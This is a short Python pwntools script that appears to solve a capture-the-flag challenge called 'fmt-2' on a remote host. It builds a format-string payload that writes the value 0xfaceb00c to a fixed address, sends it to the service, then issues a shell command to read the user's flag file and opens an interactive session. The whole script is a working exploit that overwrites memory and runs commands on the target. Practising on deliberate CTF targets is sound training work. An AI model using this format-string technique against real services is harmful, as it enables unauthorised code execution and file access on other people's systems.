#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './fmt-2'
LIBC = ''
HOST = '140.110.112.77'
PORT = 4003

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )


magic = 0x404050
pl = fmtstr_payload(6, {magic: 0xfaceb00c}, write_size='byte')
print(pl)
print(hex(len(pl)))
r.send(pl)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
